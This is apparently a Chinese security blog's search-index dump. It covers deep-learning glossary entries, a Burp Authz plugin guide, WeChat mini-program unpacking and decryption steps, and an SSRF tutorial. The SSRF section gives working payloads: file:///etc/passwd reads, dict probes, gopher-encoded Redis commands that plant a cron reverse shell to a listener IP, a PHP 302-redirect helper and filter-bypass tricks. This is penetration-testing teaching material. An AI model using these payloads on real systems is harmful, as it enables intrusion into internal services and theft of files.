","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:3","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"4.bottleneck 瓶颈的意思，通常指的是网络输入的数据维度和输出的维度不同，输出的维度比输入的小了许多，就像脖子一样，变细了。 经常设置的参数 bottle_num=256，指的是网络输出的数据的维度是256 ，可是输入进来的可能是1024维度的。 ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:4","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"5.Embedding 深度学习方法都是利用使用线性和非线性转换对复杂的数据进行自动特征抽取，并将特征表示为“向量”（vector），这一过程一般也称为“嵌入”（embedding） ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:5","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"6.xx任务 用于预训练的任务被称为前置/代理任务(pretext task)，用于微调的任务被称为下游任务(downstream task) ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:6","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"7.Warm up Warm up指的是用一个小的学习率先训练几个epoch，这是因为网络的参数是随机初始化的，一开始就采用较大的学习率容易数值不稳定。 ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:7","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["AI"],"content":"8.end to end 在论文中经常能遇到end to end这样的描述，那么到底什么是端到端呢？其实就是给了一个输入，我们就给出一个输出，不管其中的过程多么复杂，但只要给了一个输入，会对应一个输出。 比如分类问题，你输入了一张图片，网络有特征提取，全连接分类，概率计算什么的，但是跳出算法问题，单从结果来看，就是给了一张输入，输出了一个预测结果。 End-To-End的方案，即输入一张图，输出最终想要的结果，算法细节和学习过程全部丢给了神经网络。 持续更新中…… ","date":"2023-03-09","objectID":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/:0:8","tags":["深度学习","常识"],"title":"深度学习中常见名词","uri":"/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E4%B8%AD%E5%B8%B8%E8%A7%81%E5%90%8D%E8%AF%8D/"},{"categories":["draft"],"content":"1 ","date":"2023-02-18","objectID":"/%E6%B5%8B%E8%AF%95/:1:0","tags":["draft"],"title":"测试","uri":"/%E6%B5%8B%E8%AF%95/"},{"categories":["draft"],"content":"222 ","date":"2023-02-18","objectID":"/%E6%B5%8B%E8%AF%95/:1:1","tags":["draft"],"title":"测试","uri":"/%E6%B5%8B%E8%AF%95/"},{"categories":["draft"],"content":"3 //code print(111) test ","date":"2023-02-18","objectID":"/%E6%B5%8B%E8%AF%95/:1:2","tags":["draft"],"title":"测试","uri":"/%E6%B5%8B%E8%AF%95/"},{"categories":["渗透测试"],"content":" 主要用来检测水平越权(读取类)和垂直越权或未授权访问漏洞 ","date":"2023-02-11","objectID":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/:0:0","tags":["burp插件","越权","未授权","Authz"],"title":"Burp插件分享 Authz","uri":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/"},{"categories":["渗透测试"],"content":"下载 直接在burp自带的扩展的app store下载即可：Authz ","date":"2023-02-11","objectID":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/:0:1","tags":["burp插件","越权","未授权","Authz"],"title":"Burp插件分享 Authz","uri":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/"},{"categories":["渗透测试"],"content":"使用 1.拦截数据包，右键，发送到Authz 可以将需要测试的多个包都发过去，等下一步批量测试 2.在插件中的New Header中填写另一个账号(或者低权限账号)的cookie值(也可以是其他header值)： 3.等需要收集测试的数据包差不多之后，点击run进行测试，如果返回的数字一样就存在未授权访问 当原响应内容长度、响应状态码和被修改后请求的响应内容长度、响应状态码一致则会变绿。 也就代表着存在越权(仅作参考)，单击选择一行即可在下面展示出请求、响应的报文 4.一个业务系统测完之后就Clear掉所有的东西 ","date":"2023-02-11","objectID":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/:0:2","tags":["burp插件","越权","未授权","Authz"],"title":"Burp插件分享 Authz","uri":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/"},{"categories":["渗透测试"],"content":"可与HaE插件配合使用 HaE插件：对HTTP history中的数据进行正则匹配，将匹配到的数据包更改颜色 下载地址：https://github.com/gh0stkey/HaE 下载导入后会在用户根目录HaE文件下生成一个Config.yml文件，此文件为规则库，内容对应着该插件的匹配规则以及颜色设置，可修改Config.yml对它的规则进行添加与更改，也可以直接在burp中进行添加匹配规则 Authz插件与HaE插件一起使用： 在Http History界面，勾选只显示标注的数据包(前面自己设置的匹配规则)： ctrl+a全选，将所有标注的数据包选中发送到Authz中进行测试 ","date":"2023-02-11","objectID":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/:0:3","tags":["burp插件","越权","未授权","Authz"],"title":"Burp插件分享 Authz","uri":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/"},{"categories":["渗透测试"],"content":"另一个插件：Authzmatrix 也是越权检测工具，但是较新 我没有用过 ","date":"2023-02-11","objectID":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/:0:4","tags":["burp插件","越权","未授权","Authz"],"title":"Burp插件分享 Authz","uri":"/burp%E6%8F%92%E4%BB%B6%E5%88%86%E4%BA%AB-authz/"},{"categories":["渗透测试"],"content":"安卓模拟器实验 ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:1:0","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"1.准备 1.一台ROOT的安卓手机 2.解密工具：UnpackMiniApp.exe：https://gitee.com/steinven/wxpkg/blob/master/UnpackMiniApp.exe 3.反编译工具：wxappUnpacker.zip：有好多人改进的，用法类似 我用的这个：https://github.com/HQEasy/wxappUnpacker https://gitee.com/steinven/wxpkg/blob/master/wxappUnpacker.zip https://ukm028kzyr.feishu.cn/docs/doccnW1w3vwpcnjTeTYKcdErjtK https://github.com/xuedingmiaojun/wxappUnpacker 4.PC安装node环境 这里先以安卓mumu模拟器为例 mumu模拟器开启root：点击右上角的三条杠进入更多选项–\u003e进入设置中心–\u003e基本设置–\u003e在root权限中开启root权限–\u003e保存关闭 ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:1:1","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"2.提取微信小程序wxapkg包 PC端和mc段也能找到wxapkg文件，但是会有加密，建议直接用手机端的 打开微信进入测试的小程序 然后去目录里面找：/data/data/com.tencent.mm/MicroMsg/{User}/appbrand/pkg 将里面的wxapkg的文件导出到电脑上 如果无法确定是哪个小程序的包，可以根据文件的修改时间来判断 备注： 微信小程序文件存放路径： # 安卓： /data/data/com.tencent.mm/MicroMsg/{{user哈希值}}/appbrand/pkg/ # iOS越狱： /User/Containers/Data/Application/{{系统UUID}}/Library/WechatPrivate/{{user哈希值}}/WeApp/LocalCache/release/ # Windows： C:\\Users{{系统用户名}}\\Documents\\WeChat Files\\Applet\\ # macOS： /Users/xps/Library/Group Containers/5A4RE8SF68.com.tencent.xinWeChat/Library/Caches/xinWeCha/{{用户hash}}/WeApp/LocalCache/release ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:1:2","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"3.解密 直接运行UnpackMiniApp.exe，如果是加密的包，会自动解密。 没有加密的话，就跳过这条步骤，继续下面步骤。 ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:1:3","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"4.反编译 https://github.com/HQEasy/wxappUnpacker clone之后进入到wxappUnpacker文件夹中，安装依赖:npm install, 然后执行node wuWxapkg.js 包的路径，即可解包到当前目录的一个以包名为名字的 新文件夹中： ​ **如果执行脚本中可能会出现以下报错(没报错请略过)： ** SyntaxError: Unexpected end of input at new Script (node:vm:100:7) at VMScript._compileVM (/Users/lrain/SecTools/wxappUnpacker/node_modules/vm2/lib/main.js:123:22) at VM.run (/Users/lrain/SecTools/wxappUnpacker/node_modules/vm2/lib/main.js:288:10) at /Users/lrain/SecTools/wxappUnpacker/wuWxss.js:243:27 at /Users/lrain/SecTools/wxappUnpacker/wuLib.js:95:14 at agent (/Users/lrain/SecTools/wxappUnpacker/wuLib.js:64:23) at FSReqCallback.readFileAfterClose [as oncomplete] (node:internal/fs/read_file_context:68:3) 解决方案： 第一步：修改wuWxss.js文件31行 function statistic(data) { function addStat(id) { // if (!importCnt[id]) importCnt[id] = 1, statistic(pureData[id]); if(!importCnt[id]){ if(pureData){ importCnt[id]=1; statistic(pureData[id]); } } else ++importCnt[id]; } 第二步：修改wuWxss.js文件243行 // pureData = vm.run(code + \"\\n_C\"); pureData = vm.run(code + \"}\"); ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:1:4","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"5.使用 然后就是源码查看了： 在解包完成之后，我们可以直接审计代码 或者也可以打开微信小程序开发者工具，选择“导入项目”，“AppID”选择测试号并导入；接着来到“本地设置”模块， 勾选上“不校验合法域名”功能,关闭JS编译成ES5 、不校验合法域名、调试基础库，然后可以愉快的开始调试对应小程序的源码了。 ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:1:5","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"PC端实验 1.打开对应小程序的目录： 打开目录我们可以看到有很多以wx开头+16位16进制数命名的文件夹，每个文件夹下就是一个微信小程序的缓存。 随便打开一个目录目录下名为__APP__.wxapkg包就是微信小程序的主包。 有些小程序可能会有下面这种情况除了__APP__.wxapkg包外还有一个或多个其他.wxapkg后缀的文件，其他的文件就是也是小程序的包，可以看做是子包，对于功能比较复杂的小程序可能会有多个包。 2.解密： PC段为了保护源码微信使用加密的方式把wxapkg包源码进行加密，加密后的文件的起始为V1MMWX。 加密方法如下: 首先pbkdf2生成AES的key。利用微信小程序id字符串为pass，salt为saltiest 迭代次数为1000。调用pbkdf2生成一个32位的key 取原始的wxapkg的包得前1023个字节通过AES通过1生成的key和iv(the iv: 16 bytes),进行加密 接着利用微信小程序id字符串的倒数第2个字符为xor key，依次异或1023字节后的所有数据，如果微信小程序id小于2位，则xorkey 为 0x66 把AES加密后的数据（1024字节）和xor后的数据一起写入文件，并在文件头部添加V1MMWX标识 知道解密方法可以自己写解密工具或者用现成的：UnpackMiniApp.exe或者 https://codeload.github.com/superBiuBiuMan/wechatMiniAppReverse/zip/refs/heads/main 3.反编译： 跟移动端一样使用wxappUnpacker进行反编译 ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:2:0","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"参考文章 https://www.hackinn.com/index.php/archives/672/ https://blog.csdn.net/hbqjzx/article/details/126215511 https://www.cnblogs.com/lrain/p/16596405.html https://blog.csdn.net/weixin_43919632/article/details/124831351 ","date":"2023-02-10","objectID":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/:3:0","tags":["反编译","微信小程序","渗透测试"],"title":"反编译wx小程序源码(以安卓模拟器为例)","uri":"/%E5%8F%8D%E7%BC%96%E8%AF%91wx%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81%E4%BB%A5%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E4%B8%BA%E4%BE%8B/"},{"categories":["渗透测试"],"content":"SSRF简介 SSRF(server-site request forge，服务端请求伪造)是一种请求伪造，由服务器发起请求的安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统） ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:1:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞原理 大部分原因都是服务端提供从其他服务器应用获取数据的功能且没有对目标地址进行过滤和限制。如常见的从指定URL地址加载图片、文本资源或获取指定页面的网页内容等。 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:1:1","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"与CSRF区别 CSRF是客户端请求伪造，由客户端发起 SSRF由服务器发起请求的安全漏洞 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:1:2","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF危害 获取内网主机、端口和banner信息(内网端口和服务扫描) 对内外网追击的应用程序进行攻击，如Redis，jboss等 (主机本地敏感数据的读取)使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件 通过dict协议获取服务器端口运行的服务：dict://127.0.0.1:80 通过file协议访问计算机中的任意文件：file:///etc/passwd sftp代表SSH文件传输协议，tftp即简单文件传输协议，允许客户端从远程主机获取文件 可以攻击内网程序造成溢出 DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 内外网外部站点漏洞利用 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:2:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF常见位置 社交分享功能：获取超链接的标题等内容进行显示 转码服务：通过URL地址把原网址的网页内容调优使其适合手机屏幕浏览 在线翻译：给网址翻译对应网页的内容 图片加载/下载：如富文本框编辑器中的点击下载图片到本地；通过url加载或下载图片 邮件系统：比如接收邮件服务器地址 图片、文章收藏功能：网站会获取URL中title及温拌的内尔欧诺个作为以求一个好的用户体验 未公开的api实现及其他调用url的功能：可以利用google语法加上下文说的关键字来寻找 云服务厂商：他会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行SSRF测试 网站采集、网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作 数据库内置功能：：是比如mongoDB的copyDatabase函数 编码处理、属性信息处理、文件处理：比如pdf, word, xml处理器等 从远程服务器请求资源 视频解析的网站 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:3:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF漏洞挖掘 从web功能上寻找：前面常见的位置 从url关键字中寻找： share wap url link src source target u 3g display sourceURL imageURL domain ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:4:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF漏洞利用 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:5:0","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"利用方式 1.让服务端去访问相应的网址，端口扫描： http://www.xxx.com/ssrf.php?u1=http://www.yy.com:3306 2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms 3.可以使用file、dict、gopher[11]、ftp协议进行各种漏洞利用 # 使用file协议读取文件 http://www.xxx.com/ssrf.php?u1=file:///var/www/html/index.php #利用dict协议查看端口 curl -v 'http://xxx.com/ssrf.php?url=dict://127.0.0.1:22' # 利用gopher协议攻击redis反弹shell curl -v \"http://xxx.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fyourip%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a\" 4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}） 5.攻击内网应用程序（利用跨协议通信技术） 6.判断内网主机是否存活：方法是访问看是否有端口开放 7.DoS攻击（请求大文件，始终保持连接keep-alive always） Gopher协议 互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。（可以模拟GET/POST请求，换行使用%0d%0a，空白行%0a）。 Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议 Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用 利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求 Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。 gopher协议格式： gopher://\u003chost\u003e:\u003cport\u003e/\u003cgopher-path\u003e_后接TCP数据流 如： curl gopher://localhost:2222/hello%0agopher dict 词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。 curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info 如果服务端有屏蔽回显的代码，那么这种回显方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据 file 本地文件传输协议，主要用于访问本地计算机中的文件 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:5:1","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"302 SSRF 当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL 那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。 我们继续构造一个302跳转服务，代码如下302.php: \u003c?php $schema = $_GET['s']; $ip = $_GET['i']; $port = $_GET['p']; $query = $_GET['q']; if(empty($port)){ header(\"Location: $schema://$ip/$query\"); } else { header(\"Location: $schema://$ip:$port/$query\"); } 利用测试 # dict protocol - 探测Redis dict://127.0.0.1:6379/info curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict\u0026i=127.0.0.1\u0026port=6379\u0026query=info' # file protocol - 任意文件读取 curl -vvv 'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file\u0026query=/etc/passwd' # gopher protocol - 一键反弹Bash # * 注意: gopher跳转的时候转义和`url`入参的方式有些区别 curl -vvv 'http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher\u0026i=127.0.0.1\u0026p=6389\u0026query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0 a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20\u003e\u0026%20/dev/tcp/103.21.140.84/6789%200\u003e\u00261%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d %0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3 %0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:5:2","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF + Redis未授权 众所周知，redis未授权的三种姿势： 1.redis写入ssh公钥，获取操作系统权限； 2.直接向Web目录中写webshell； 3.linux计划任务执行命令反弹shell。 使用gopher协议来实现 gopher协议 比如存在ssrf的漏洞地址为：http://192.168.1.11/ssrf.php?url= 结合gother协议构造符合格式的paylod，从而模拟redis通信 http://192.168.1.11/ssrf.php?url=gother://127.0.0.1:6379/_payload #转换为： http://192.168.1.11/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_payload payload如下： ## 这里使用利用redis写计划任务任务来反弹shell的利用方式 set x \"\\n\\n*/1 * * * * /bin/bash -i \u003e\u0026 /dev/tcp/192.168.11.12/4444 0\u003e\u00261\\n\\n\" config set dir /var/spool/cron/ config set dbfilename root save 将以上命令构造成符合gopher协议格式，且能够通过URL传输的格式来发送，需要经过如下步骤： 1.将payload进行url编码 2.替换%0a为%0d%0a 3.然后再重复一次以上的两个步骤 原因：替换回车换行为%0d%0a，空格以%20替换, HTTP包最后加%0d%0a`代表消息结束 4.将得到的结果，替代http://192.168.1.11/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_payload里面payload的位置得到 5.然后直接在浏览器中访问，或者在kaili中执行 curl 完整的payload 然后就可以在攻击机上获得反弹的shell 注意，以上利用方式，如果是ubuntu的系统，是无法成功的 ","date":"2023-02-09","objectID":"/ssrf%E6%BC%8F%E6%B4%9E/:5:3","tags":["SSRF","基础漏洞"],"title":"SSRF漏洞","uri":"/ssrf%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SSRF漏洞防御绕过 1.利用各种其他协议 file:/// file protocol (任意文件读取) Dict:// dict://\u003cuser-auth\u003e@\u003chost\u003e:\u003cport\u003e/d:\u003cword\u003e SFTP://Sftp代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol） TFTP:// LDAP:// 或ldaps:// 或ldapi:// Gopher 2.IP地址进制转换 IP地址进行各种进制的转换（八进制/十六进制等） 127.0.0.1 八进制：0177.0.0.1 十六进制：0x7f.0.0.1 十进制：2130706433 3.利用[::] 可以利用[::]来绕过localhost： http://[::]:80/ \u003e\u003e\u003e http://127.0.0.1 4.利用@ http://xxx.com@www.baidu.com/与http://www.baidu.com/请求时是相同的，实际请求的是@之后的。 但是在对@解析域名中，不同的处理函数存在处理差异，如： http://www.aaa.com@www.bbb.com@www.ccc.com 在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com 5.短网址 如：https://dwz.cn/ http://tool.chinaz.com/tools/dwz.aspx 等 6.利用特殊域名 原理是DNS解析。 xip.io可以指向任意域名，即 127.0.0.1.xip.io # 可解析为127.0.0.1 7.利用DNS解析 在域名上设置A记录，指向127.0.1 8.句号 127。0。0。1 \u003e\u003e\u003e 127.0.0.1 9.302跳转 比如使用：https://tinyurl.com 等网站生成302跳转地址 10.利用封闭式字符数字 ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ »\u003e example.com #利用Enclosed alphanumericss ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ \u003e\u003e\u003e example.com #List: ① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ 